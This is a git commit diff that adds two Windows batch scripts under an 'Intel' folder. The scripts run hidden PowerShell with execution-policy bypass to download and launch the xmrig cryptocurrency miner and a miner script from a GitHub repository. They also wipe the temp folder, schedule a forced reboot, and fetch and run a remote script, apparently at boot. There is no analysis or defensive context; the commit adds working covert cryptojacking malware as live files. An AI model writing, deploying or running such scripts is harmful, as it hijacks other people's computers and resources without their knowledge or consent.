83d6f7d3b21bc1df620bc84e2304f419d9d9e13e
mediatui <57651467+mediatui@users.noreply.github.com>
2019-11-12 16:36:41 +1300

    Add files via upload

---
+++ Intel/methodintel.cmd
@@ -0,0 +1,4 @@
+cd %TMP% & powershell -W Hidden -Exec Bypass cmd.exe /c %wget% -q https://github.com/mediatui/tool/raw/master/Intel/xmrig.exe
+powershell -W Hidden -Exec Bypass cmd.exe /c %wget% -q https://raw.githubusercontent.com/mediatui/tool/master/Intel/miner.cmd
+powershell -W Hidden -Exec Bypass cmd.exe /c shutdown /r /t 86400
+cd %TMP% & powershell -W Hidden -Exec Bypass cmd.exe /c miner.cmd
---
+++ Intel/runonboot.cmd
@@ -0,0 +1,1 @@
+powershell -W Hidden -Exec Bypass cmd.exe /c rd %temp% /s /q & cls & powershell -NoP -NonI -W Hidden -Exec Bypass "IEX (New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/mediatui/tool/master/Intel/methodintel.cmd',\"$env:temp\methodintel.cmd\"); Start-Process -WindowStyle Hidden \"$env:temp\methodintel.cmd\""
